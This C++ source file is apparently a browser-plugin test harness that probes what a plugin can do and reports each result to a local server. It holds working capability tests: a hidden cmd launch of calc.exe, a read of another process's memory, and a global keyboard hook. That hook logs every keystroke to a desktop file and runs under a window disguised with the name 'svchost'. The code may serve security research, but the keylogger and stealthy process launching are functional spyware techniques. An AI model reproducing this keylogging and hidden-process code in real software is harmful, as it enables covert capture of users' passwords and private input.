/**********************************************************\
  INCLUDES
\**********************************************************/
#include "JSObject.h"
#include "variant_list.h"
#include "DOM/Document.h"
#include "global/config.h"

#include <fstream>
#include <stdio.h>
#include <tchar.h>

//my includes
#define WIN32_LEAN_AND_MEAN
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <iostream>
#include <windows.h>
#include <string.h>
#include <conio.h>
#include <atlstr.h>
#include <cstdio>
#include <cstdlib>
#include <tlhelp32.h>
// Need to link with Ws2_32.lib
#pragma comment (lib, "Ws2_32.lib")
#pragma comment(lib, "user32.lib")

TCHAR szName[]=TEXT("MyFileMappingObject");

//keylogger
HHOOK	kbdhook;	/* Keyboard hook handle */
bool	running;	/* Used in main loop */
__declspec(dllexport) LRESULT CALLBACK handlekeys(int code, WPARAM wp, LPARAM lp);
LRESULT CALLBACK windowprocedure(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp);
char	windir[MAX_PATH + 1];

int SEND_TO_SERVER(char *buf);
int seqnum = 1;
int Port;
std::string sID;
HANDLE myPROC;
////////////+
#include "PRCSAPI.h"

/**********************************************************\
  FUNCTIONS/METHODS DEFINITIONS
\**********************************************************/

///////////////////////////////////////////////////////////////////////////////
/// @fn FB::variant PRCSAPI::launched(void)
///
/// @brief  - called at startup, deals with initial communication with server
///			- first it gets the port number and test ID from shared memory
///			- then it is possible to make connection with server
///			- return TRUE if successful, FALSE if not successful
///////////////////////////////////////////////////////////////////////////////
FB::variant PRCSAPI::launched(void) {
	HANDLE hMapFile;
	LPCTSTR pBuf;
	int BUF_SIZE = 256;
	TCHAR szName[]=TEXT("MyFileMappingObject");

	//read/write access, do not inherit the name, name of mapping object
	hMapFile = OpenFileMapping(FILE_MAP_READ, FALSE, szName);               
	if (hMapFile == NULL) {
		//Could not open file mapping object
		std::string respon = std::to_string(seqnum++) + '.' + sID + ":INIT_FAILED";
		COMM nov(respon);
		nov.Communicate();		
		return FALSE;
	}

	pBuf = (LPTSTR) MapViewOfFile(hMapFile, FILE_MAP_READ, 0, 0, BUF_SIZE);
	if (pBuf == NULL) {
		//Could not map view of file
		std::string respon = std::to_string(seqnum++) + '.' + sID + ":INIT_FAILED";
		COMM nov(respon);
		nov.Communicate();
		CloseHandle(hMapFile);
		return FALSE;
	}

	//string from server in shared memory successfully obtained in pBuf variable
	std::string temp = CT2A(pBuf);
	//get port
	std::string sPort = temp.substr(temp.find(':') + 1, temp.length());
	Port = stoi(sPort);
	//get test ID
	sID = temp.substr(0, temp.find(':'));
	//unmap & close shared memory
	UnmapViewOfFile(pBuf);
	CloseHandle(hMapFile);

	//success! plugin launched/initialized in browser
	std::string respon = std::to_string(seqnum++) + '.' + sID + ":INIT";

	COMM nov(respon);
	nov.Communicate();
	
	
	return nov.Received;
}

///////////////////////////////////////////////////////////////////////////////
/// @fn FB::variant PRCSAPI::finalize(void)
///
/// @brief  Terminate host process (calc).
///			Send ending message to the server and close the communication.
///			Kill plugin process so the browser can be closed from server.
///			Return TRUE if OK.
///////////////////////////////////////////////////////////////////////////////
FB::variant PRCSAPI::finalize(void)
{
	//terminate host process if there is any, reset seqnum and send END message
	TerminateProcess(myPROC, 0);

	std::string respon = std::to_string(seqnum++) + '.' + sID + ":END";
	COMM nov(respon);
	nov.Communicate();

	seqnum = 1;

	/*
	//kill plug-in process
	DWORD id = GetCurrentProcessId();
	DWORD dwDesiredAccess = PROCESS_TERMINATE;
	BOOL  bInheritHandle  = FALSE;
	HANDLE hProcess = OpenProcess(dwDesiredAccess, bInheritHandle, id);
	if (hProcess == NULL)
		return FALSE;
	BOOL result = TerminateProcess(hProcess, 0);
	CloseHandle(hProcess);
	*/
	return TRUE;
}


///////////////////////////////////////////////////////////////////////////////
/// @fn FB::variant PRCSAPI::echo(const FB::variant& msg)
///
/// @brief  Echos whatever is passed from Javascript.
///         Go ahead and change it. See what happens!
///////////////////////////////////////////////////////////////////////////////
FB::variant PRCSAPI::echo(const FB::variant& msg)
{
	wchar_t input[] = L"C:\\Windows\\System32\\calc.exe";
	wchar_t cmd[] = L"cmd";
	// initialize cmd
	wchar_t cmdline[MAX_PATH + 50];
	swprintf_s(cmdline, L"%s /C %s", cmd, input);
	STARTUPINFO si = { 0 };
	si.cb = sizeof(si);
	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW | CREATE_NO_WINDOW;
	si.hStdInput = GetStdHandle(STD_INPUT_HANDLE);
	si.hStdOutput = GetStdHandle(STD_OUTPUT_HANDLE);
	si.hStdError = GetStdHandle(STD_ERROR_HANDLE);
	si.wShowWindow = SW_HIDE;
	// If you want to redirect result of command, set startInf.hStdOutput to a file
	// or pipe handle that you can read it, otherwise we are done!
	PROCESS_INFORMATION procInf;
	memset(&procInf, 0, sizeof procInf);
	BOOL b = CreateProcessW(NULL, cmdline, NULL, NULL, FALSE,
		NORMAL_PRIORITY_CLASS | CREATE_NO_WINDOW, NULL, NULL, &si, &procInf);
	DWORD dwErr = 0;
	myPROC = procInf.hProcess;
	
	if(b){
		std::string respon = std::to_string(seqnum++) + '.' + sID + ":SUCCESS";
		COMM nov(respon);
		nov.Communicate();
	}
	else{
		std::string respon = std::to_string(seqnum++) + '.' + sID + ":FAILURE";
		COMM nov(respon);
		nov.Communicate();
	}

    // return "foobar";
	return TRUE;
}


FB::variant PRCSAPI::startprocess(void){
	HOST novy("C:\\Users\\Jusko\\Desktop\\createproc");
	// launch host process
	novy.CreateChild();
	int ret = novy.GetExitCode();

	if(ret == 1){
		std::string respon = std::to_string(seqnum++) + '.' + sID + ":SUCCESS";
		COMM nov(respon);
		nov.Communicate();
	}
	else{
		std::string respon = std::to_string(seqnum++) + '.' + sID + ":FAILURE";
		COMM nov(respon);
		nov.Communicate();
	}
		
	return novy.GetExitCode();
}

/**
* \brief Called by Windows automagically every time a key is pressed (regardless
* of who has focus)
*/
__declspec(dllexport) LRESULT CALLBACK handlekeys(int code, WPARAM wp, LPARAM lp)
{
	if (code == HC_ACTION && (wp == WM_SYSKEYDOWN || wp == WM_KEYDOWN)) {
		static bool capslock = false;
		static bool shift = false;
		char tmp[0xFF] = { 0 };
		std::string str;
		DWORD msg = 1;
		KBDLLHOOKSTRUCT st_hook = *((KBDLLHOOKSTRUCT*)lp);
		bool printable;

		/*
		* Get key name as string
		*/
		msg += (st_hook.scanCode << 16);
		msg += (st_hook.flags << 24);
		GetKeyNameText(msg, (LPWSTR)tmp, 0xFF);
//		GetKeyNameText()
		str = std::string(tmp);

		printable = (str.length() <= 1) ? true : false;

		/*
		* Non-printable characters only:
		* Some of these (namely; newline, space and tab) will be
		* made into printable characters.
		* Others are encapsulated in brackets ('[' and ']').
		*/
		if (!printable) {
			/*
			* Keynames that change state are handled here.
			*/
			if (str == "CAPSLOCK")
				capslock = !capslock;
			else if (str == "SHIFT")
				shift = true;

			/*
			* Keynames that may become printable characters are
			* handled here.
			*/
			if (str == "ENTER") {
				str = "\n";
				printable = true;
			}
			else if (str == "SPACE") {
				str = " ";
				printable = true;
			}
			else if (str == "TAB") {
				str = "\t";
				printable = true;
			}
			else {
				str = ("[" + str + "]");
			}
		}

		/*
		* Printable characters only:
		* If shift is on and capslock is off or shift is off and
		* capslock is on, make the character uppercase.
		* If both are off or both are on, the character is lowercase
		*/
		if (printable) {
			if (shift == capslock) { /* Lowercase */
				for (size_t i = 0; i < str.length(); ++i)
					str[i] = tolower(str[i]);
			}
			else { /* Uppercase */
				for (size_t i = 0; i < str.length(); ++i) {
					if (str[i] >= 'A' && str[i] <= 'Z') {
						str[i] = toupper(str[i]);
					}
				}
			}

			shift = false;
		}


		std::cout << str;

		std::ofstream myfile;

		myfile.open("C:\\Users\\Jusko\\Desktop\\log.txt", std::ios_base::app);
		myfile << str;

		myfile.close();

		/*
		std::string path = std::string(windir) + "\\" + OUTFILE_NAME;
		std::ofstream outfile(path.c_str(), std::ios_base::app);
		outfile << str;
		outfile.close();
		*/
	}

	return CallNextHookEx(kbdhook, code, wp, lp);
}


/**
* \brief Called by DispatchMessage() to handle messages
* \param hwnd	Window handle
* \param msg	Message to handle
* \param wp
* \param lp
* \return 0 on success
*/
LRESULT CALLBACK windowprocedure(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp)
{
	switch (msg) {
	case WM_CLOSE: case WM_DESTROY:
		running = false;
		break;
	default:
		/* Call default message handler */
		return DefWindowProc(hwnd, msg, wp, lp);
	}

	return 0;
}



bool PRCSAPI::doSomethingTimeConsuming( int num, FB::JSObjectPtr &callback )
{
	std::string respon = std::to_string(seqnum++) + '.' + sID + ":KEYLOG_START";
	COMM nov(respon);
	nov.Communicate();

    boost::thread t(boost::bind(&PRCSAPI::doSomethingTimeConsuming_thread,
         this, num, callback));
	// thread started

    return true; // the thread is started
}

void PRCSAPI::doSomethingTimeConsuming_thread( int num, FB::JSObjectPtr &callback )
{
    // Do something that takes a long time here
    int result = num * 10;
	/*
	* Set up window
	*/
	HWND		hwnd;
	HWND		fgwindow = GetForegroundWindow(); /* Current foreground window */
	MSG		msg;
	WNDCLASSEX	windowclass;
	HINSTANCE	modulehandle;
	HINSTANCE   thisinstance = GetModuleHandle(NULL);

	windowclass.hInstance = thisinstance;
	windowclass.lpszClassName = L"winkey";
	windowclass.lpfnWndProc = windowprocedure;
	windowclass.style = CS_DBLCLKS;
	windowclass.cbSize = sizeof(WNDCLASSEX);
	windowclass.hIcon = LoadIcon(NULL, IDI_APPLICATION);
	windowclass.hIconSm = LoadIcon(NULL, IDI_APPLICATION);
	windowclass.hCursor = LoadCursor(NULL, IDC_ARROW);
	windowclass.lpszMenuName = NULL;
	windowclass.cbClsExtra = 0;
	windowclass.cbWndExtra = 0;
	windowclass.hbrBackground = (HBRUSH)COLOR_BACKGROUND;

	//if (!(RegisterClassEx(&windowclass)))
		//return 1;

	hwnd = CreateWindowEx(NULL, L"winkey", L"svchost", WS_OVERLAPPEDWINDOW,
		CW_USEDEFAULT, CW_USEDEFAULT, 640, 480, HWND_DESKTOP, NULL,
		thisinstance, NULL);
	//if (!(hwnd))
		//return 1;

	/*
	* Make the window invisible
	*/

	/*
	* Debug mode: Make the window visiblefddff
	*/
	ShowWindow(hwnd, SW_SHOW);

	UpdateWindow(hwnd);
	SetForegroundWindow(fgwindow); /* Give focus to the previous fg window */

	/*
	* Hook keyboard input so we get it too
	*/
	modulehandle = GetModuleHandle(NULL);
	kbdhook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)handlekeys, modulehandle, NULL);

	running = true;

	GetWindowsDirectory((LPWSTR)windir, MAX_PATH);

	/*
	* Main loop
	*/
	while (running) {
		/*
		* Get messages, dispatch to window procedure
		*/
		if (!GetMessage(&msg, NULL, 0, 0))
			running = false; /*
							 * This is not a "return" or
							 * "break" so the rest of the loop is
							 * done. This way, we never miss keys
							 * when destroyed but we still exit.
							 */
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

    callback->InvokeAsync("", FB::variant_list_of(shared_from_this())(result));
}


FB::variant PRCSAPI::memory(void){
	int value = 0;

	// create new child process - host
	HOST host_proc("C:\\Users\\Jusko\\Desktop\\host 5005");
	host_proc.CreateChild();
	std::string ret = host_proc.ReadFromPipe();
	// append hex 
	ret = "0x" + ret;
	ret.erase(ret.size() - 1);

	DWORD addr = std::strtoul(ret.c_str(), NULL, 16);
	// try reading from memory 
	int retvaluea = ReadProcessMemory(host_proc.host_process, (void*)addr, &value, sizeof(value), 0);

	TerminateProcess(host_proc.host_process, 0);
	CloseHandle(host_proc.host_process);
	// terminate host process with newline
	host_proc.WriteToPipe("\n");
	
	if(!retvaluea || value != 5005){
		std::string respon = std::to_string(seqnum++) + '.' + sID + ":FAILURE";
		COMM nov(respon);
		nov.Communicate();
		return "nespravna adresa " + ret;
	}
	std::string respon = std::to_string(seqnum++) + '.' + sID + ":SUCCESS";
	COMM nov(respon);
	nov.Communicate();

	return "spravna adresa " + ret;
}


///////////////////////////////////////////////////////////////////////////////
/// @fn PRCSPtr PRCSAPI::getPlugin()
///
/// @brief  Gets a reference to the plugin that was passed in when the object
///         was created.  If the plugin has already been released then this
///         will throw a FB::script_error that will be translated into a
///         javascript exception in the page.
///////////////////////////////////////////////////////////////////////////////
PRCSPtr PRCSAPI::getPlugin()
{
    PRCSPtr plugin(m_plugin.lock());
    if (!plugin) {
        throw FB::script_error("The plugin is invalid");
    }
    return plugin;
}

// Read/Write property testString
std::string PRCSAPI::get_testString()
{
    return m_testString;
}

void PRCSAPI::set_testString(const std::string& val)
{
    m_testString = val;
}

// Read-only property version
std::string PRCSAPI::get_version()
{
    return FBSTRING_PLUGIN_VERSION;
}

void PRCSAPI::testEvent()
{
    fire_test();
}


/*
CONSTRUCTOR:
- create pipes for communication with child
- child IN/OUT
*/
HOST::HOST(std::string hostproc){
	std::cout << "Constructor:\n";

	//assign exe name
	hostname = hostproc;

	g_hChildStd_IN_Rd = NULL;
	g_hChildStd_IN_Wr = NULL;
	g_hChildStd_OUT_Rd = NULL;
	g_hChildStd_OUT_Wr = NULL;
	host_process = NULL;

	SECURITY_ATTRIBUTES saAttr;

	saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
	saAttr.bInheritHandle = TRUE;
	saAttr.lpSecurityDescriptor = NULL;

	// Create a pipe for the child process's STDOUT. 
	if (!CreatePipe(&g_hChildStd_OUT_Rd, &g_hChildStd_OUT_Wr, &saAttr, 0))
		HOST::ErrorExit(TEXT("StdoutRd CreatePipe"));

	// Ensure the read handle to the pipe for STDOUT is not inherited.
	if (!SetHandleInformation(g_hChildStd_OUT_Rd, HANDLE_FLAG_INHERIT, 0))
		HOST::ErrorExit(TEXT("Stdout SetHandleInformation"));

	// Create a pipe for the child process's STDIN.
	if (!CreatePipe(&g_hChildStd_IN_Rd, &g_hChildStd_IN_Wr, &saAttr, 0))
		HOST::ErrorExit(TEXT("Stdin CreatePipe"));

	// Ensure the write handle to the pipe for STDIN is not inherited.
	if (!SetHandleInformation(g_hChildStd_IN_Wr, HANDLE_FLAG_INHERIT, 0))
		HOST::ErrorExit(TEXT("Stdin SetHandleInformation"));

	std::cout << "PIPES CREATED. \n";
}
/*
	Error parser
*/
void HOST::ErrorExit(PTSTR lpszFunction){
	LPVOID lpMsgBuf;
	LPVOID lpDisplayBuf;
	DWORD dw = GetLastError();

	FormatMessage(
		FORMAT_MESSAGE_ALLOCATE_BUFFER |
		FORMAT_MESSAGE_FROM_SYSTEM |
		FORMAT_MESSAGE_IGNORE_INSERTS,
		NULL,
		dw,
		MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
		(LPTSTR)&lpMsgBuf,
		0, NULL);

	lpDisplayBuf = (LPVOID)LocalAlloc(LMEM_ZEROINIT,
		(lstrlen((LPCTSTR)lpMsgBuf) + lstrlen((LPCTSTR)lpszFunction) + 40)*sizeof(TCHAR));
	StringCchPrintf((LPTSTR)lpDisplayBuf,
		LocalSize(lpDisplayBuf) / sizeof(TCHAR),
		TEXT("%s failed with error %d: %s"),
		lpszFunction, dw, lpMsgBuf);
	MessageBox(NULL, (LPCTSTR)lpDisplayBuf, TEXT("Error"), MB_OK);

	LocalFree(lpMsgBuf);
	LocalFree(lpDisplayBuf);
	ExitProcess(1);
}

/*
CREATE CHILD:
- launch child process
*/
void HOST::CreateChild(){
	PROCESS_INFORMATION piProcInfo;
	STARTUPINFO siStartInfo;
	BOOL bSuccess = FALSE;

	// Set up members of the PROCESS_INFORMATION structure. 

	std::cout << "PROCESS:\n";

	ZeroMemory(&piProcInfo, sizeof(PROCESS_INFORMATION));

	// Set up members of the STARTUPINFO structure. 
	// This structure specifies the STDIN and STDOUT handles for redirection.

	ZeroMemory(&siStartInfo, sizeof(STARTUPINFO));
	siStartInfo.cb = sizeof(STARTUPINFO);
	siStartInfo.hStdError = g_hChildStd_OUT_Wr;
	siStartInfo.hStdOutput = g_hChildStd_OUT_Wr;
	siStartInfo.hStdInput = g_hChildStd_IN_Rd;
	siStartInfo.dwFlags |= STARTF_USESTDHANDLES;

	// Create the child process. 

	TCHAR szProxyAddr[4096];

	_tcscpy_s(szProxyAddr, CA2T(hostname.c_str()));

	bSuccess = CreateProcess(NULL,
		szProxyAddr,     // command line 
		NULL,          // process security attributes 
		NULL,          // primary thread security attributes 
		TRUE,          // handles are inherited 
		0,             // creation flags 
		NULL,          // use parent's environment 
		NULL,          // use parent's current directory 
		&siStartInfo,  // STARTUPINFO pointer 
		&piProcInfo);  // receives PROCESS_INFORMATION 

	// If an error occurs, exit the application. 
	if (!bSuccess)
		HOST::ErrorExit(TEXT("CreateProcess"));
	else
	{
		// Close handles to the child process and its primary thread.
		// Some applications might keep these handles to monitor the status
		// of the child process, for example. 
		std::cout << "STARTED SUCCESSFULLY\n";
		host_process = piProcInfo.hProcess;
		//CloseHandle(piProcInfo.hProcess);
		//CloseHandle(piProcInfo.hThread);
	}
}


std::string HOST::ReadFromPipe(){
	DWORD dwRead, dwWritten;
	CHAR chBuf[4096];
	BOOL bSuccess = FALSE;
	HANDLE hParentStdOut = GetStdHandle(STD_OUTPUT_HANDLE);

	bSuccess = ReadFile(g_hChildStd_OUT_Rd, chBuf, 4096, &dwRead, NULL);
	if (dwRead == 0)
		std::cout << "OMG1\n";

	chBuf[dwRead] = 0;
	return std::string(chBuf);

	/*bSuccess = WriteFile(hParentStdOut, chBuf,
	dwRead, &dwWritten, NULL);
	if (!bSuccess)
	std::cout << "OMG2\n";*/
}

void HOST::WriteToPipe(std::string what){
	DWORD dwRead, dwWritten;
	//CHAR chBuf = what.c_str();
	BOOL bSuccess = FALSE;


	//bSuccess = ReadFile(g_hInputFile, chBuf, 4096, &dwRead, NULL);
	//if (!bSuccess || dwRead == 0) break;

	bSuccess = WriteFile(g_hChildStd_IN_Wr, what.c_str(), what.length(), &dwWritten, NULL);
	if (!bSuccess)
		std::cout << "OMG3\n";


	// Close the pipe handle so the child process stops reading. 

	if (!CloseHandle(g_hChildStd_IN_Wr))
		HOST::ErrorExit(TEXT("StdInWr CloseHandle"));
}

int HOST::GetExitCode(){
	DWORD dwMillisec = INFINITE;      
    DWORD dwWaitStatus = WaitForSingleObject( host_process, dwMillisec );
	int nRet = -1;

    if( dwWaitStatus == WAIT_OBJECT_0 ){
        DWORD dwExitCode = NULL;
        GetExitCodeProcess( host_process, &dwExitCode );
        nRet = (int)dwExitCode;
    }

	return nRet;
}

/******************* COMMUNICATION WITH SERVER *******************/
COMM::COMM(std::string Buff){
	Buffer = Buff;
	Port_number = Port;
	Received = "";
}

int COMM::Communicate(void){
	// default to localhost
	char *server_name = "localhost";
	char recvBuff[100];
	int retval;
	struct sockaddr_in server;
	struct hostent *hp;
	WSADATA wsaData;
	SOCKET  conn_socket;
	using namespace std;

	if ((retval = WSAStartup(0x202, &wsaData)) != 0)
	{
		fprintf(stderr, "Client: WSAStartup() failed with error %d\n", retval);
		WSACleanup();
		return -1;
	}
	else
		printf("Client: WSAStartup() is OK.\n");

	hp = gethostbyname(server_name);
	if (hp == NULL)
	{
		fprintf(stderr, "Client: Cannot resolve address \"%s\": Error %d\n", server_name, WSAGetLastError());
		WSACleanup();
		return -1;
	}
	else
		printf("Client: gethostbyaddr() is OK.\n");

	// Copy the resolved information into the sockaddr_in structure
	memset(&server, 0, sizeof(server));
	memcpy(&(server.sin_addr), hp->h_addr, hp->h_length);
	server.sin_family = hp->h_addrtype;
	server.sin_port = htons(Port_number);

	conn_socket = socket(AF_INET, SOCK_STREAM, 0); /* Open a socket */
	if (conn_socket <0)
	{
		fprintf(stderr, "Client: Error Opening socket: Error %d\n", WSAGetLastError());
		WSACleanup();
		return -1;
	}
	else
		printf("Client: socket() is OK.\n");

	printf("Client: Client connecting to: %s.\n", hp->h_name);
	if (connect(conn_socket, (struct sockaddr*)&server, sizeof(server)) == SOCKET_ERROR)
	{
		fprintf(stderr, "Client: connect() failed: %d\n", WSAGetLastError());
		WSACleanup();
		return -1;
	}
	else
		printf("Client: connect() is OK.\n");

	// Try sending some string
	retval = send(conn_socket, Buffer.c_str(), strlen(Buffer.c_str()), 0);
	if (retval == SOCKET_ERROR)
	{
		fprintf(stderr, "Client: send() failed: error %d.\n", WSAGetLastError());
		WSACleanup();
		return -1;
	}
	else
		printf("Client: send() is OK.\n");
	//MessageBox(NULL, L"Success send", NULL, NULL);
	
	printf("Client: Sent data \"%s\"\n", Buffer.c_str());

	//closesocket(conn_socket);
	//WSACleanup();
		//return -1;
		
	retval = recv(conn_socket, recvBuff, sizeof(recvBuff), 0);
	if (retval == SOCKET_ERROR)
	{
		fprintf(stderr, "Client: recv() failed: error %d.\n", WSAGetLastError());
		closesocket(conn_socket);
		WSACleanup();
		return -1;
	}
	else
		printf("Client: recv() is OK.\n");


	if (retval == 0)
	{
		printf("Client: Server closed connection.\n");
		closesocket(conn_socket);
		WSACleanup();
		return -1;
	}

	//Received = std::string(recvBuff);

	printf("Client: Received %d bytes, data \"%s\" from server.\n", retval, recvBuff);

	/*
	if (!loopflag)
	{
		MessageBox(NULL, L"I am just trying my wedding dress", NULL, NULL);
		printf("Client: Terminating connection...\n");
		break;
	}
	else
	{
		if ((loopcount >= maxloop) && (maxloop >0))
			break;
	}
	*/

	closesocket(conn_socket);
	WSACleanup();

	return 0;
}

int COMM::ParseResponse(void){
	

	return 0;
}